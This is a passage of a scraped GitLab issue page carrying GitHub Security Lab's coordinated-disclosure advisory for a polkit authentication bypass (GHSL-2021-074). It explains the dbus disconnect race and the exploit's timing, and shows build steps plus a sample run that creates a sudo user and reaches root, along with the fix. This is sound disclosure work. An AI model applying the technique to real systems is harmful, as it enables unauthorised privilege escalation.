class="n">polkit_backend_session_monitor_get_user_for_subject</span> <span class="p">(</span><span class="n">priv</span><span class="o">-&gt;</span><span class="n">session_monitor</span><span class="p">,</span></span>&#x000A;<span id="LC2" class="line" lang="c">                                                                      <span class="n">caller</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span></span>&#x000A;<span id="LC3" class="line" lang="c">                                                                      <span class="o">&amp;</span><span class="n">error</span><span class="p">);</span></span>&#x000A;<span id="LC4" class="line" lang="c"><span class="k">if</span> <span class="p">(</span><span class="n">error</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span></span>&#x000A;<span id="LC5" class="line" lang="c">  <span class="p">{</span></span>&#x000A;<span id="LC6" class="line" lang="c">    <span class="n">g_simple_async_result_set_from_error</span> <span class="p">(</span><span class="n">simple</span><span class="p">,</span> <span class="n">error</span><span class="p">);</span></span>&#x000A;<span id="LC7" class="line" lang="c">    <span class="n">g_simple_async_result_complete</span> <span class="p">(</span><span class="n">simple</span><span class="p">);</span></span>&#x000A;<span id="LC8" class="line" lang="c">    <span class="n">g_object_unref</span> <span class="p">(</span><span class="n">simple</span><span class="p">);</span></span>&#x000A;<span id="LC9" class="line" lang="c">    <span class="n">g_error_free</span> <span class="p">(</span><span class="n">error</span><span class="p">);</span></span>&#x000A;<span id="LC10" class="line" lang="c">    <span class="k">goto</span> <span class="n">out</span><span class="p">;</span></span>&#x000A;<span id="LC11" class="line" lang="c">  <span class="p">}</span></span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h4 data-sourcepos="177:1-177:14" dir="auto">&#x000A;<a id="user-content-resources" class="anchor" href="#resources" aria-hidden="true"></a>Resources</h4>&#x000A;<p data-sourcepos="179:1-179:126" dir="auto">Proof of concept exploit: <a data-sourcepos="179:27-179:126" href="/-/project/884/uploads/4848937fcc7d601e63684c76d8c3e309/GHSL-2021-074-polkit.bundle" data-canonical-src="/uploads/4848937fcc7d601e63684c76d8c3e309/GHSL-2021-074-polkit.bundle" data-link="true" class="gfm">GHSL-2021-074-polkit.bundle</a></p>&#x000A;<h2 data-sourcepos="181:1-181:9" dir="auto">&#x000A;<a id="user-content-credit" class="anchor" href="#credit" aria-hidden="true"></a>Credit</h2>&#x000A;<p data-sourcepos="183:1-183:130" dir="auto">This issue was discovered and reported by GHSL team member <a data-sourcepos="183:60-183:129" href="https://github.com/kevinbackhouse" rel="nofollow noreferrer noopener" target="_blank">@kevinbackhouse (Kevin Backhouse)</a>.</p>&#x000A;<h2 data-sourcepos="185:1-185:10" dir="auto">&#x000A;<a id="user-content-contact" class="anchor" href="#contact" aria-hidden="true"></a>Contact</h2>&#x000A;<p data-sourcepos="187:1-187:147" dir="auto">You can contact the GHSL team at <code data-sourcepos="187:35-187:56">securitylab@github.com</code>, please include a reference to <code data-sourcepos="187:91-187:103">GHSL-2021-074</code> in any communication regarding this issue.</p>&#x000A;<h2 data-sourcepos="189:1-189:20" dir="auto">&#x000A;<a id="user-content-disclosure-policy" class="anchor" href="#disclosure-policy" aria-hidden="true"></a>Disclosure Policy</h2>&#x000A;<p data-sourcepos="191:1-191:112" dir="auto">This report is subject to our <a data-sourcepos="191:31-191:111" href="https://securitylab.github.com/advisories#policy" rel="nofollow noreferrer noopener" target="_blank">coordinated disclosure policy</a>.</p></div>
</div>

</div>
<div class="js-issue-widgets">
<div class="emoji-block emoji-block-sticky">
<div class="row gl-m-0 gl-justify-between">
<div class="js-noteable-awards">
<div class="gl-flex gl-flex-wrap gl-justify-between gl-pt-3">
<div data-can-award-emoji="false" data-path="/api/v4/projects/884/issues/140/award_emoji" data-show-default-award-emojis="true" id="js-vue-awards-block"></div>

</div>

</div>
<div class="new-branch-col gl-font-size-0 gl-my-2">

</div>
</div>
</div>

</div>
</div>
<div class="js-issue-widgets">

<div class="gl-border-solid gl-border-1 gl-border-gray-100 gl-rounded-base gl-mt-5 gl-p-3 gl-text-center">
To upload designs, you'll need to enable LFS and have an admin enable hashed storage. <a href="/help/user/project/issues/design_management.md#prerequisites" target="_blank" rel="noopener noreferrer">More information</a>
</div>

<div class="js-work-item-links-root" data-full-path="polkit/polkit" data-issuable-id="40527" data-issuable-iid="140" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-default-branch="master" data-wi-full-path="polkit/polkit" data-wi-group-path="polkit" data-wi-is-signed-in="false" data-wi-issues-list-path="/polkit/polkit/-/issues" data-wi-labels-manage-path="/polkit/polkit/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>


<div class="js-related-issues-root" data-can-add-related-issues="false" data-endpoint="/polkit/polkit/-/issues/140/links" data-full-path="polkit/polkit" data-has-issue-weights-feature="false" data-has-iterations-feature="false" data-help-path="/help/user/project/issues/related_issues.md" data-is-group="false" data-issuable-type="issue" data-show-categorized-issues="false" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-default-branch="master" data-wi-full-path="polkit/polkit" data-wi-group-path="polkit" data-wi-is-signed-in="false" data-wi-issues-list-path="/polkit/polkit/-/issues" data-wi-labels-manage-path="/polkit/polkit/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div data-has-closing-merge-request="false" data-iid="140" data-project-path="polkit/polkit" id="js-related-merge-requests"></div>
<div data-url="/polkit/polkit/-/issues/140/related_branches" id="related-branches">
</div>
</div>
<div class="js-issue-widgets">
<section class="issuable-discussion js-vue-notes-event">
<div data-can-add-timeline-events="false" data-current-user-data="null" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-noteable-data="{&quot;id&quot;:40527,&quot;iid&quot;:140,&quot;description&quot;:&quot;# GitHub Security Lab (GHSL) Vulnerability Report: `GHSL-2021-074`\n\nThe [GitHub Security Lab](https://securitylab.github.com) team has identified potential security vulnerabilities in [polkit](https://gitlab.freedesktop.org/polkit/polkit).\n\nWe are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.\n\nIf at any point you have concerns or questions about this process, please do not hesitate to reach out to us at `securitylab@github.com` (please include `GHSL-2021-074` as a reference).\n\nIf you are _NOT_ the correct point of contact for this report, please let us know!\n\n## Summary\n\nThere is an authentication bypass vulnerability in polkit, which enables an unprivileged user to get authorization from polkit to perform a privileged action.\n\n## Product\n\n[polkit](https://gitlab.freedesktop.org/polkit/polkit)\n\n## Tested Versions\n\n* policykit-1, 0.105-26ubuntu1 (tested on Ubuntu 20.04.2 LTS)\n* policykit-1, 0.105-30 (tested on Ubuntu 21.04)\n* polkit, 0.116-7 (tested on Fedora 32)\n\n## Details\n\n### Issue 1: Authentication bypass in polkit (`GHSL-2021-074`)\n\nThe function [`polkit_system_bus_name_get_creds_sync`](https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.116/src/polkit/polkitsystembusname.c#L388) is used to get the uid and pid of the process requesting the action. It does this by sending the unique bus name of the requesting process, which is typically something like \&quot;:1.96\&quot;, to `dbus-daemon`. These unique names are assigned and managed by `dbus-daemon` and cannot be forged, so this is a good way to check the privileges of the requesting process.\n\nThe vulnerability happens when the requesting process disconnects from `dbus-daemon` just before the call to `polkit_system_bus_name_get_creds_sync` starts. In this scenario, the unique bus name is no longer valid, so `dbus-daemon` sends back an error reply. This error case is handled in `polkit_system_bus_name_get_creds_sync` by setting the value of the `error` parameter, but it still returns `TRUE`, rather than `FALSE`. We are not sure whether it&#39;s a bug that the return value is TRUE when this error happens, but this behavior certainly means that all callers of `polkit_system_bus_name_get_creds_sync` need to carefully check whether an error was set. If the calling function forgets to check for errors then it will think that the uid of the requesting process is 0 (because the `AsyncGetBusNameCredsData` struct is zero initialized). In other words, it will think that the action was requested by a root process, and will therefore allow it.\n\nMost of the callers of `polkit_system_bus_name_get_creds_sync` check the error value correctly, and are therefore not vulnerable. But the error value is not checked in the following stack trace:\n\n```\n0  in polkit_system_bus_name_get_creds_sync of polkitsystembusname.c:393\n1  in polkit_system_bus_name_get_user_sync of polkitsystembusname.c:511\n2  in polkit_backend_session_monitor_get_user_for_subject of polkitbackendsessionmonitor-systemd.c:303\n3  in check_authorization_sync of polkitbackendinteractiveauthority.c:1113\n4  in check_authorization_sync of polkitbackendinteractiveauthority.c:1223\n5  in polkit_backend_interactive_authority_check_authorization of polkitbackendinteractiveauthority.c:971\n6  in server_handle_check_authorization of polkitbackendauthority.c:795\n7  in server_handle_method_call of polkitbackendauthority.c:1274\n```\n\nThe bug is in this snippet of code in [`check_authorization_sync`](https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.116/src/polkitbackend/polkitbackendinteractiveauthority.c#L1121):\n\n```c\n/* every subject has a user; this is supplied by the client, so we rely\n * on the caller to validate its acceptability. */\nuser_of_subject = polkit_backend_session_monitor_get_user_for_subject (priv-\u003esession_monitor,\n                                                                       subject, NULL,\n                                                                       error);\nif (user_of_subject == NULL)\n    goto out;\n\n/* special case: uid 0, root, is _always_ authorized for anything */\nif (POLKIT_IS_UNIX_USER (user_of_subject) \u0026\u0026 polkit_unix_user_get_uid (POLKIT_UNIX_USER (user_of_subject)) == 0)\n  {\n    result = polkit_authorization_result_new (TRUE, FALSE, NULL);\n    goto out;\n  }\n```\n\nNotice that the value of `error` is not checked.\n\n#### Proof of concept exploit\n\nThe attached proof of concept exploit uses this vulnerability to create a new user account with `sudo` privileges. It does so by calling the `CreateUser` method on the `org.freedesktop.Accounts` service. The `CreateUser` method uses polkit to check the authorization. The basic concept of the exploit is to disconnect from `dbus-daemon` before polkit calls the `polkit_system_bus_name_get_creds_sync` function. The slightly tricky part of the exploit is to get the timing right. As mentioned above, most of the callers of `polkit_system_bus_name_get_creds_sync` check the error correctly and will deny the request. If you put a breakpoint on `polkit_system_bus_name_get_creds_sync`, you will see that the vulnerable stack trace doesn&#39;t occur until the sixth time the breakpoint is hit. Therefore, the key to a working exploit is to get the timing right, so that the disconnection happens just before the sixth call to `polkit_system_bus_name_get_creds_sync`. In practice though, it seems to be fairly easy to trigger the vulnerability by trying repeatedly, with a random delay inserted each time.\n\nPlease find the source code for the proof of concept exploit attached. It&#39;s packaged as a [git bundle](https://git-scm.com/docs/git-bundle), which you can unpack like this:\n\n```bash\ngit clone -b main GHSL-2021-074-polkit.bundle\n```\n\nAfter you have unpacked the bundle, you will find a README with further instructions on how to build and run the PoC.\n\nHere&#39;s a sample run:\n\n```bash\nkev@constellation:~$ git clone -b main GHSL-2021-074-polkit.bundle\nCloning into &#39;GHSL-2021-074-polkit&#39;...\nReceiving objects: 100% (8/8), 17.48 KiB | 17.48 MiB/s, done.\nkev@constellation:~$ cd GHSL-2021-074-polkit/\nkev@constellation:~/GHSL-2021-074-polkit$ git submodule update --init\nSubmodule &#39;DBusParse&#39; (https://github.com/kevinbackhouse/DBusParse.git) registered for path &#39;DBusParse&#39;\nCloning into &#39;/home/kev/GHSL-2021-074-polkit/DBusParse&#39;...\nSubmodule path &#39;DBusParse&#39;: checked out &#39;0d28bdc3ba1c6c4e69e125aa394eddd6edb7622f&#39;\nkev@constellation:~/GHSL-2021-074-polkit$ mkdir build\nkev@constellation:~/GHSL-2021-074-polkit$ cd build/\nkev@constellation:~/GHSL-2021-074-polkit/build$ cmake ..\n-- The C compiler identification is GNU 9.3.0\n-- The CXX compiler identification is GNU 9.3.0\n-- Check for working C compiler: /usr/bin/cc\n-- Check for working C compiler: /usr/bin/cc -- works\n-- Detecting C compiler ABI info\n-- Detecting C compiler ABI info - done\n-- Detecting C compile features\n-- Detecting C compile features - done\n-- Check for working CXX compiler: /usr/bin/c++\n-- Check for working CXX compiler: /usr/bin/c++ -- works\n-- Detecting CXX compiler ABI info\n-- Detecting CXX compiler ABI info - done\n-- Detecting CXX compile features\n-- Detecting CXX compile features - done\n-- Configuring done\n-- Generating done\n-- Build files have been written to: /home/kev/GHSL-2021-074-polkit/build\nkev@constellation:~/GHSL-2021-074-polkit/build$ make\nScanning dependencies of target DBusParse\n[  6%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus.cpp.o\n[ 13%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_auth.cpp.o\n[ 20%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_parse.cpp.o\n[ 26%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_print.cpp.o\n[ 33%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_random.cpp.o\n[ 40%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_serialize.cpp.o\n[ 46%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_utils.cpp.o\n[ 53%] Linking CXX shared library libDBusParse.so\n[ 53%] Built target DBusParse\nScanning dependencies of target DBusParseUtils\n[ 60%] Building CXX object DBusParse/src/DBusParseUtils/CMakeFiles/DBusParseUtils.dir/parse.cpp.o\n[ 66%] Building CXX object DBusParse/src/DBusParseUtils/CMakeFiles/DBusParseUtils.dir/utils.cpp.o\n[ 73%] Linking CXX shared library libDBusParseUtils.so\n[ 73%] Built target DBusParseUtils\nScanning dependencies of target createuser\n[ 80%] Building CXX object CMakeFiles/createuser.dir/createuser.cpp.o\n[ 80%] Building CXX object CMakeFiles/createuser.dir/createuser.cpp.o\n[ 86%] Linking CXX executable createuser\n[ 86%] Built target createuser\nScanning dependencies of target DBusParseUnitTests\n[ 93%] Building CXX object DBusParse/tests/DBusParseUnitTests/CMakeFiles/DBusParseUnitTests.dir/dbus_unit_tests.cpp.o\n[100%] Linking CXX executable DBusParseUnitTests\n[100%] Built target DBusParseUnitTests\nkev@constellation:~/GHSL-2021-074-polkit/build$ ./createuser /var/run/dbus/system_bus_socket boris iaminvincible!\nElapsed time: 5794122 nanoseconds\nSuccessfully created /org/freedesktop/Accounts/User1008 after 2 iterations,\nwith a delay value of 1990058 nanoseconds\nElapsed time: 9143521 nanoseconds\nSuccess!\nkev@constellation:~/GHSL-2021-074-polkit/build$ id boris\nuid=1008(boris) gid=1008(boris) groups=1008(boris),27(sudo)\nkev@constellation:~/GHSL-2021-074-polkit/build$ su - boris\nPassword:\nTo run a command as administrator (user \&quot;root\&quot;), use \&quot;sudo \u003ccommand\u003e\&quot;.\nSee \&quot;man sudo_root\&quot; for details.\n\nboris@constellation:~$ sudo su\n[sudo] password for boris:\nroot@constellation:/home/boris# whoami\nroot\nroot@constellation:/home/boris#\n```\n\n#### Impact\n\nThis issue may lead to local privilege escalation on any Linux system that uses polkit.\n\n#### Remediation\n\nAdd a check for `error != NULL`, like this example (from [`polkit_backend_interactive_authority_check_authorization`](https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.116/src/polkitbackend/polkitbackendinteractiveauthority.c#L910)):\n\n```c\nuser_of_caller = polkit_backend_session_monitor_get_user_for_subject (priv-\u003esession_monitor,\n                                                                      caller, NULL,\n                                                                      \u0026error);\nif (error != NULL)\n  {\n    g_simple_async_result_set_from_error (simple, error);\n    g_simple_async_result_complete (simple);\n    g_object_unref (simple);\n    g_error_free (error);\n    goto out;\n  }\n```\n\n#### Resources\n\nProof of concept exploit: [GHSL-2021-074-polkit.bundle](/uploads/4848937fcc7d601e63684c76d8c3e309/GHSL-2021-074-polkit.bundle)\n\n## Credit\n\nThis issue was discovered and reported by GHSL team member [@kevinbackhouse (Kevin Backhouse)](https://github.com/kevinbackhouse).\n\n## Contact\n\nYou can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2021-074` in any communication regarding this issue.\n\n## Disclosure Policy\n\nThis report is subject to our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).&quot;,&quot;title&quot;:&quot;GHSL-2021-074: authentication bypass vulnerability in polkit&quot;,&quot;time_estimate&quot;:0,&quot;total_time_spent&quot;:0,&quot;human_time_estimate&quot;:null,&quot;human_total_time_spent&quot;:null,&quot;state&quot;:&quot;closed&quot;,&quot;milestone_id&quot;:null,&quot;updated_by_id&quot;:2155,&quot;created_at&quot;:&quot;2021-05-04T20:26:41Z&quot;,&quot;updated_at&quot;:&quot;2021-09-11T14:37:44Z&quot;,&quot;milestone&quot;:null,&quot;labels&quot;:[],&quot;lock_version&quot;:1,&quot;author_id&quot;:14586,&quot;confidential&quot;:false,&quot;discussion_locked&quot;:null,&quot;assignees&quot;:[],&quot;due_date&quot;:null,&quot;project_id&quot;:884,&quot;moved_to_id&quot;:null,&quot;duplicated_to_id&quot;:null,&quot;web_url&quot;:&quot;/polkit/polkit/-/issues/140&quot;,&quot;current_user&quot;:{&quot;can_create_note&quot;:false,&quot;can_create_confidential_note&quot;:false,&quot;can_update&quot;:false,&quot;can_set_issue_metadata&quot;:false,&quot;can_award_emoji&quot;:false},&quot;create_note_path&quot;:&quot;/polkit/polkit/notes?target_id=40527\u0026target_type=issue&quot;,&quot;preview_note_path&quot;:&quot;/polkit/polkit/-/preview_markdown?target_id=140\u0026target_type=Issue&quot;,&quot;is_project_archived&quot;:true,&quot;archived_project_docs_path&quot;:&quot;/help/user/project/working_with_projects.md#delete-a-project&quot;,&quot;issue_email_participants&quot;:[],&quot;type&quot;:&quot;ISSUE&quot;}" data-noteable-type="Issue" data-notes-data="{&quot;noteableType&quot;:&quot;issue&quot;,&quot;noteableId&quot;:40527,&quot;projectId&quot;:884,&quot;groupId&quot;:null,&quot;discussionsPath&quot;:&quot;/polkit/polkit/-/issues/140/discussions.json&quot;,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;newSessionPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;quickActionsDocsPath&quot;:&quot;/help/user/project/quick_actions.md&quot;,&quot;closePath&quot;:&quot;/polkit/polkit/-/issues/140.json?issue%5Bstate_event%5D=close&quot;,&quot;reopenPath&quot;:&quot;/polkit/polkit/-/issues/140.json?issue%5Bstate_event%5D=reopen&quot;,&quot;notesPath&quot;:&quot;/polkit/polkit/noteable/issue/40527/notes&quot;,&quot;prerenderedNotesCount&quot;:10,&quot;lastFetchedAt&quot;:1736376882000000,&quot;notesFilter&quot;:null}" data-notes-filters="{&quot;Show all activity&quot;:0,&quot;Show comments only&quot;:1,&quot;Show history only&quot;:2}" data-report-abuse-path="/-/abuse_reports/add_category" data-show-timeline-view-toggle="false" data-target-type="issue" id="js-vue-notes"></div>
</section>

</div>
</div>
<aside aria-label="issue" aria-live="polite" class="right-sidebar js-right-sidebar js-issuable-sidebar right-sidebar-expanded" data-always-show-toggle data-auto-collapse data-issuable-type="issue">
<div class="issuable-sidebar">
<div class="issuable-sidebar-header">
<button class="gl-button btn btn-md btn-default gutter-toggle gl-float-right js-sidebar-toggle has-tooltip !gl-shadow-none gl-block " type="button" aria-label="Toggle sidebar" title="Collapse sidebar" data-container="body" data-placement="left" data-boundary="viewport" type="button"><span class="gl-button-text">
<span class="js-sidebar-toggle-container gl-button-text" data-is-expanded="true"><svg class="s16 js-sidebar-expand hidden" data-testid="chevron-double-lg-left-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-left"></use></svg><svg class="s16 js-sidebar-collapse " data-testid="chevron-double-lg-right-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-right"></use></svg></span>

</span>

</button></div>
<form class="issuable-context-form inline-update js-issuable-update " action="/polkit/polkit/-/issues/140.json" accept-charset="UTF-8" data-remote="true" method="post"><div class="block assignee gl-mt-3" data-testid="assignee-block-container">
<div class="js-sidebar-assignees-root" data-field="issue" data-max-assignees="1">
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Assignee</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>

</div>

<div class="js-sidebar-labels-widget-root" data-allow-label-create="" data-allow-scoped-labels="" data-can-edit="" data-iid="140" data-issuable-type="issue" data-labels-fetch-path="/polkit/polkit/-/labels.json?include_ancestor_groups=true" data-labels-manage-path="/polkit/polkit/-/labels" data-project-issues-path="/polkit/polkit/-/issues" data-project-path="polkit/polkit" data-selected-labels="[]"></div>
<div class="block milestone" data-testid="sidebar-milestones">
<div class="js-sidebar-milestone-widget-root" data-can-edit="" data-issue-iid="140" data-project-path="polkit/polkit"></div>
</div>

<div class="js-sidebar-due-date-widget-root"></div>
<div class="js-sidebar-time-tracking-root block">
<!-- / Fallback while content is loading -->
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Time tracking</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>
<script id="js-confidential-issue-data" type="application/json">{"is_confidential":false,"is_editable":null}</script>
<div class="js-sidebar-confidential-widget-root"></div>

<div class="js-sidebar-participants-widget-root"></div>
</form><script class="js-sidebar-options" type="application/json">{"endpoint":"/polkit/polkit/-/issues/140.json?serializer=sidebar_extras","toggleSubscriptionEndpoint":"/polkit/polkit/-/issues/140/toggle_subscription","moveIssueEndpoint":"/polkit/polkit/-/issues/140/move","projectsAutocompleteEndpoint":"/-/autocomplete/projects?project_id=884","editable":"","currentUser":{},"rootPath":"/","fullPath":"polkit/polkit","iid":140,"id":40527,"severity":"unknown","timeTrackingLimitToHours":false,"canCreateTimelogs":null,"createNoteEmail":null,"issuableType":"issue","directlyInviteMembers":"false"}</script>
</div>
</aside>



</main>
</div>


</div>
</div>


<script>
//<![CDATA[
if ('loading' in HTMLImageElement.prototype) {
  document.querySelectorAll('img.lazy').forEach(img => {
    img.loading = 'lazy';
    let imgUrl = img.dataset.src;
    // Only adding width + height for avatars for now
    if (imgUrl.indexOf('/avatar/') > -1 && imgUrl.indexOf('?') === -1) {
      const targetWidth = img.getAttribute('width') || img.width;
      imgUrl += `?width=${targetWidth}`;
    }
    img.src = imgUrl;
    img.removeAttribute('data-src');
    img.classList.remove('lazy');
    img.classList.add('js-lazy-loaded');
    img.dataset.testid = 'js-lazy-loaded-content';
  });
}

//]]>
</script>
<script>
//<![CDATA[
gl = window.gl || {};
gl.experiments = {};


//]]>
</script>

</body>
</html>

